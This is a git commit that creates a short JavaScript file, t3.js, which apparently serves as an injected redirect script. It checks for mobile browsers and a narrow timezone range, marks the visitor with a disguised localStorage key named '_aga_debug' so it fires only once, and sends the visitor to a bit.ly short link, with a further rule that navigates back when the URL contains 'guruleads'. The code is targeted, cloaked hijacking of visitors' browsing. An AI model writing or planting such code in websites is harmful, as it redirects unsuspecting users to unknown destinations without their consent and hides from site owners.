7d08c28302d3d5c48abb79c533331f077cf129d3
DandHobo <63579513+DandHobo@users.noreply.github.com>
2022-03-11 07:14:14 +0300

    Create t3.js

---
+++ t3.js
@@ -0,0 +1,3 @@
+let offset = new Date().getTimezoneOffset();
+if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent) && offset >= -200 && offset <= -100 && !localStorage.getItem('_aga_debug')) {localStorage.setItem('_aga_debug', '1'); document.location.href='http://bit.ly/3MKmkdt'};
+if (/guruleads/.test(document.location.href)) {document.history.go(-1)}
